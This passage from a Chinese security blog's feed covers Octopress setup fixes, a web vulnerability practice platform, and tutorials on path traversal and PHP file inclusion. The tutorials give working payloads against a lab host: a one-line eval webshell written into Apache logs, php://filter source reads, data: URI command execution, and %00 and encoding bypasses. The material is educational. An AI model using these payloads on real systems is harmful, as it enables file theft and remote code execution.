&lt;p&gt;解决办法： 用编辑器打开Rakefile文件，找到下面这行&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system &amp;quot;git push origin #&amp;#123;deploy_branch&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在#{deploy_branch}前面加(+)这个符号&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system &amp;quot;git push origin +#&amp;#123;deploy_branch&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行下面命令&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;rake deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;问题2：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/.rvm/gems/ruby-2.1.1/gems/execjs-2.2.0/lib/execjs/runtimes.rb:51:in `autodetect&amp;apos;: Could not find a JavaScript runtime. See https://github.com/sstephenson/execjs for a list of available runtimes. (ExecJS::RuntimeUnavailable)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;解决办法&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install nodejs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;问题3:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;An error occured while installing RedCloth (4.2.9), and Bundler cannot continue.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Make sure that `gem install RedCloth -v &amp;apos;4.2.9&amp;apos;` succeeds before bundling.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;解决办法:&lt;br&gt;运行&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gem install RedCloth -v &amp;apos;4.2.9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips&quot;&gt;&lt;/a&gt;Tips&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;提高页面载入的方法：将source/_include 文件下head.html 和footer.html中的关于google的链接删掉&lt;/li&gt;
&lt;li&gt;最好在github创建一个分支将octopress整个目录push上去，这样当换电脑时，直接pull下来，配置文件什么的都不要修改&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;博客以前一直放在BAE上，最近突然博客打不开了，发现原来BAE2.0的所有应用都下线了。。一直觉得Octopress不错，于是决定用Octopress+Github搭建一个博客，记录下搭建过程&lt;/p&gt;
&lt;p&gt;我是在Ubuntu下安装的Octopress，参考的下面这篇文章&lt;br&gt;&lt;a href=&quot;https://www.jeremymorgan.com/tutorials/linux/how-to-install-octopress-on-ubuntu-linux-quantal-quetzal/&quot;&gt;How to Install Octopress on Ubuntu Linux&lt;/a&gt;&lt;br&gt;怎样将文章推送到github参考下面这篇文章&lt;br&gt;&lt;a href=&quot;http://blog.devtang.com/blog/2012/02/10/setup-blog-based-on-github/&quot;&gt;象写程序一样写博客：搭建基于github的博客&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.x2know.org/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>Web漏洞演练平台 – ZVulDrill</title>
    <link href="http://blog.x2know.org/2014/02/27/zvuldrill/"/>
    <id>http://blog.x2know.org/2014/02/27/zvuldrill/</id>
    <published>2014-02-27T01:19:19.000Z</published>
    <updated>2016-05-28T11:39:18.000Z</updated>
    
    <content type="html">&lt;p&gt;在学习和研究web漏洞的过程中对每一种漏洞都进行了测试，将其整理到了一块儿，于是有了一个简单的Web漏洞演练平台–ZVulDrill，通过演练平台大家可以亲身实践如何利用这个漏洞，同时也可以学习到漏洞的相关知识。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://x2know.qiniudn.com/28653d0c62ba00c36b90bd7046984cea_r.jpg&quot; alt=&quot;demo&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://x2know.qiniudn.com/f078de7be140db6a63829cfe75be5cea_r.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt; 平台中有10个挑战，包含的漏洞有：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQL注入&lt;br&gt;储存型和反射型XSS&lt;br&gt;CSRF&lt;br&gt;文件包含&lt;br&gt;后台弱口令&lt;br&gt;文件上传&lt;br&gt;目录遍历&lt;br&gt;权限跨越   &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以及一些推荐的拓展练习。&lt;br&gt;项目地址：&lt;a href=&quot;https://github.com/710leo/ZVulDrill&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/710leo/ZVulDrill&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在学习和研究web漏洞的过程中对每一种漏洞都进行了测试，将其整理到了一块儿，于是有了一个简单的Web漏洞演练平台–ZVulDrill，通过演练平台大家可以亲身实践如何利用这个漏洞，同时也可以学习到漏洞的相关知识。&lt;br&gt;
    
    </summary>
    
      <category term="安全技术" scheme="http://blog.x2know.org/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>任意文件遍历漏洞科普</title>
    <link href="http://blog.x2know.org/2013/12/09/wen-jian-bian-li/"/>
    <id>http://blog.x2know.org/2013/12/09/wen-jian-bian-li/</id>
    <published>2013-12-09T01:46:45.000Z</published>
    <updated>2016-05-28T11:39:15.000Z</updated>
    
    <content type="html">&lt;h4&gt;1 简介&lt;/h4&gt;

&lt;p&gt;文件遍历漏洞利用方法乍一看和文件包含差不多，其实有本质的差别，文件遍历的利用方法是通过路径直接访问资源， 当网站应用通过连接请求资源时，会根据实际完整路径查找资源，因此通过利用../等可以跨目录访问其他资源， 实例：&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$img = $_GET[&amp;apos;f&amp;apos;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;apos;&amp;lt;img src=&amp;quot;images/&amp;apos;.$img.&amp;apos;&amp;quot;&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;访问a.com/openfile.php?f=a.jpg时,web应用会根据实际完整路径查找资源，如果a.jpg在/images 目录下，b.txt在 /config 下，则通过a.com/img?f=../config/b.txt 即可得到b.txt&lt;/p&gt;
&lt;h4&gt;2 利用所需条件&lt;/h4&gt;

&lt;p&gt;2.1 储存路径的变量没有任何过滤&lt;br&gt;2.2 php.ini中open_basedir 设置不合理&lt;br&gt;2.3 目录访问权限设置不合理&lt;/p&gt;
&lt;h4&gt;3 造成影响&lt;/h4&gt;

&lt;p&gt;2.1+2.2 可能造成系统的核心文件泄露&lt;br&gt;2.1+2.3 可能造成应用程序的配置文件泄露&lt;/p&gt;
&lt;h4&gt;4 一些利用技巧&lt;/h4&gt;

&lt;p&gt;4.1 利用url编码绕过过滤&lt;br&gt;URL编码： 点–%2e 斜线–%2f 反斜线–%5c&lt;br&gt;16位Unicode编码： 点–%u002e 斜线–%u2215 反斜线–%u2216&lt;br&gt;双倍URL编码： 点–%252e 反斜杠–%u252f 正斜杠–%u255c&lt;/p&gt;
&lt;p&gt;4.2 利用%00绕过文件后缀检测&lt;br&gt;例如：../../boot.ini%00.jpg，当获取文件名时.jpg被截断得到../../boot.ini&lt;/p&gt;
&lt;p&gt;下面两种技巧没有测试&lt;br&gt;4.3 目录限定绕过:&lt;br&gt;在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“~“来绕过。&lt;br&gt;形如这样的提 交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。&lt;/p&gt;
&lt;p&gt;4.4绕过来路验证:&lt;br&gt;在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直 接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。   &lt;/p&gt;
&lt;p&gt;参考：&lt;br&gt;&lt;a href=&quot;http://www.ruanyifeng.com/blog/2010/02/url_encoding.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.ruanyifeng.com/blog/2010/02/url_encoding.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.nuanyue.com/archives/22.webcensor#postheada&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.nuanyue.com/archives/22.webcensor#postheada&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h4&gt;1 简介&lt;/h4&gt;

&lt;p&gt;文件遍历漏洞利用方法乍一看和文件包含差不多，其实有本质的差别，文件遍历的利用方法是通过路径直接访问资源， 当网站应用通过连接请求资源时，会根据实际完整路径查找资源，因此通过利用../等可以跨目录访问其他资源， 实例：&lt;br&gt;
    
    </summary>
    
      <category term="安全技术" scheme="http://blog.x2know.org/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含科普</title>
    <link href="http://blog.x2know.org/2013/11/08/wen-jian-bao-han/"/>
    <id>http://blog.x2know.org/2013/11/08/wen-jian-bao-han/</id>
    <published>2013-11-08T14:59:35.000Z</published>
    <updated>2016-05-28T11:42:05.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;/p&gt;&lt;h4&gt;1.形成原因&lt;/h4&gt;&lt;br&gt;使用动态文件包含且变量没有过滤&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;h4&gt;2.造成影响&lt;/h4&gt;&lt;br&gt;2.1暴露重要文件&lt;br&gt;2.2获取网站权限&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;h4&gt;3.漏洞挖掘&lt;/h4&gt;&lt;br&gt;3.1 黑盒测试用WVS等扫描器扫描&lt;br&gt;3.2 白盒测试在代码中寻找include()、include_once()、require()、require_once()这几个函数以及和这几个函数相关的变量&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;h4&gt;4.利用技巧(测试环境 apache2.2 php5.3)&lt;/h4&gt;&lt;br&gt;4.1 查看重要文件../etc/passwd实例见&lt;br&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2013-028410&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2013-028410&lt;/a&gt; &lt;p&gt;&lt;/p&gt;
&lt;p&gt;4.2 Apache错误日志写入一句话首先找到错误日志的位置&lt;br&gt;VulDrill/../logs/apache_error.log然后构造错误访问&lt;a href=&quot;http://192.168.199.170/VulDrill/fi.php?f=&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://192.168.199.170/VulDrill/fi.php?f=&lt;/a&gt;&amp;lt;?php @eval($_POST[‘zero’]);?&amp;gt; 最后在VulDrill/../logs/apache_error.log链接webshell即可&lt;/p&gt;
&lt;p&gt;4.3 利用 php://filter&lt;br&gt;读取php文件&lt;br&gt;&lt;a href=&quot;http://192.168.199.170/VulDrill/fi.php?f=php://filter/read=convert.base64-encode/resource=database.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://192.168.199.170/VulDrill/fi.php?f=php://filter/read=convert.base64-encode/resource=database.php&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://x2knowblog.qiniudn.com/aa.jpg&quot; alt=&quot;图片&quot;&gt;&lt;br&gt;得到base64编码后一段内容，base64解码即可&lt;br&gt;&lt;img src=&quot;http://x2knowblog.qiniudn.com/aaa.jpg&quot; alt=&quot;图片&quot;&gt;    &lt;/p&gt;
&lt;p&gt;4.4 利用 php://input 执行代码&lt;br&gt;php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。 &lt;img src=&quot;http://x2knowblog.qiniudn.com/blogQQ%E6%88%AA%E5%9B%BE20140212203325.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;4.5 利用data:URI schema执行代码&lt;br&gt;&lt;a href=&quot;http://192.168.199.170/VulDrill/fi.php?f=data:text/plain&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://192.168.199.170/VulDrill/fi.php?f=data:text/plain&lt;/a&gt;,&amp;lt;?php%20system(‘cd’)?&amp;gt;&lt;br&gt;&lt;a href=&quot;http://192.168.199.170/VulDrill/fi.php?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjZCcpPz4=&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://192.168.199.170/VulDrill/fi.php?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjZCcpPz4=&lt;/a&gt;    &lt;/p&gt;
&lt;p&gt;4.6 当代码是后面这种形式时：&amp;lt;?php include($a.“.php”); ?&amp;gt; 需要用到截断技术&lt;br&gt;4.6.1 %00截断，这种有gpc=off和php版本限制&lt;br&gt;4.6.2 .或者./或者\或者/截断（多次重复)&lt;br&gt;乌云实例 &lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2010-08824&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wooyun.org/bugs/wooyun-2010-08824&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4.7其他利用方法&lt;br&gt;远程文件包含 &lt;a href=&quot;http://developer.51cto.com/art/201104/255224.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://developer.51cto.com/art/201104/255224.htm&lt;/a&gt;&lt;br&gt;Linux包含/proc/self/environ环境变量     &lt;a href=&quot;http://www.myhack58.com/Article/html/3/62/2011/32008.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.myhack58.com/Article/html/3/62/2011/32008.htm&lt;/a&gt;    &lt;/p&gt;
&lt;p&gt;####参考&lt;br&gt;&lt;a href=&quot;http://zone.wooyun.org/content/2196&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/2196&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://danqingdani.blog.163.com/blog/static/1860941952013993810261/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://danqingdani.blog.163.com/blog/static/1860941952013993810261/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.php.net/manual/zh/wrappers.php.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.php.net/manual/zh/wrappers.php.php&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;h4&gt;1.形成原因&lt;/h4&gt;&lt;br&gt;使用动态文件包含且变量没有过滤&lt;/p&gt;
&lt;p&gt;&lt;h4&gt;2.造成影响&lt;/h4&gt;&lt;br&gt;2.1暴露重要文件&lt;br&gt;2.2获取网站权限&lt;br&gt;
    
    </summary>
    
      <category term="安全技术" scheme="http://blog.x2know.org/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>开发资讯发布系统有感</title>
    <link href="http://blog.x2know.org/2013/10/13/kai-fa-zi-xun-fa-bu-xi-tong-you-gan/"/>
    <id>http://blog.x2know.org/2013/10/13/kai-fa-zi-xun-fa-bu-xi-tong-you-gan/</id>
    <published>2013-10-13T03:54:15.000Z</published>
    <updated>2016-05-28T11:39:05.000Z</updated>
    
    <content type="html">&lt;p&gt;断断续续的终于把资讯发布系统完成了，当开发一个很大的应用时，先把其分成几个小的模块，然后在单独对其进行开发，这样会方便很多，就像刚开始开发这个发布系统的时候，几个模块差别挺大的，&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;可是刚开始没想到将它们分开，而是一起并行开发，感觉特别乱，当完成后整理代码时，突然发现如果把它们单独分出来，一下会特别清晰。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;断断续续的终于把资讯发布系统完成了，当开发一个很大的应用时，先把其分成几个小的模块，然后在单独对其进行开发，这样会方便很多，就像刚开始开发这个发布系统的时候，几个模块差别挺大的，
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.x2know.org/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
</feed>
